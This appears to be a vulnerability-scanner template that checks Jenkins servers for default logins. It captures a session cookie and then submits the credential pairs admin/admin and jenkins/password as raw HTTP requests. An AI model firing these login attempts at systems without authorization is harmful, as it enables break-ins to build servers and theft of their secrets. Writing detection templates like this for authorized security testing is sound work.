id: jenkins-weak-password
info:
  author: Zandros0
  name: Jenkins Weak Password
  severity: high
  tags: jenkins,default-login
requests:
- extractors:
  - internal: true
    name: cookie
    part: header
    regex:
    - JSESSIONID\..*=([a-z0-9.]+)
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains(body_4, "/logout")
    - contains(body_4, "Dashboard [Jenkins]")
    type: dsl
  raw:
  - 'GET /login HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /j_spring_security_check HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: {{cookie}}


    j_username=admin&j_password=admin&from=%2F&Submit=Sign+in

    '
  - 'POST /j_spring_security_check HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: {{cookie}}


    j_username=jenkins&j_password=password&from=%2F&Submit=Sign+in

    '
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    Cookie: {{cookie}}

    '
  req-condition: true
